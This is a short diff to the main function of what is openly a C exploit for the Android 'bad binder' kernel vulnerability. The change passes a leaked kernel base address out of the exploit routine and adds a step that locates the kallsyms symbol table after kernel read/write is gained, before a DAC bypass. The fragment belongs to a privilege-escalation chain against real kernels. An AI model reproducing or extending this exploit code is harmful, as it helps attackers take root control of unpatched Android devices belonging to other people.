@@ -26,6 +26,7 @@ int32_t main(int32_t argc, char *argv[])
     char* pszRootExecPath = NULL;
     uint64_t pTaskStruct = 0;
     uint64_t pThreadInfo = 0;
+    uint64_t pKernelBase = 0;
     uint64_t pSecurityHookHeads = 0;
     uint64_t pSecurityCapableListItem = 0;
     uint64_t ulAddrLimit = USER_DS;
@@ -61,7 +62,7 @@ int32_t main(int32_t argc, char *argv[])
     printf("[+] options are set, we're ready to go :)\n");
     printf("[!] attempting to exploit bad binder...\n");
 
-    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo))
+    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo, &pKernelBase))
     {
         printf("[-] exploiting bad binder failed :(\n");
         printf("[-] kernel may not be vulnerable\n");
@@ -73,6 +74,14 @@ int32_t main(int32_t argc, char *argv[])
     printf("[+] should now have kernel r/w!\n");
 
     bKernelRw = true;
+
+    printf("[!] searching for kallsyms table...\n");
+
+    if(0 != init_kallsyms_tbl(pKernelBase))
+    {
+        printf("[-] failed to locate kallsyms table\n");
+        goto done;
+    }
 
     printf("[!] attempting to bypass dac...\n");
 
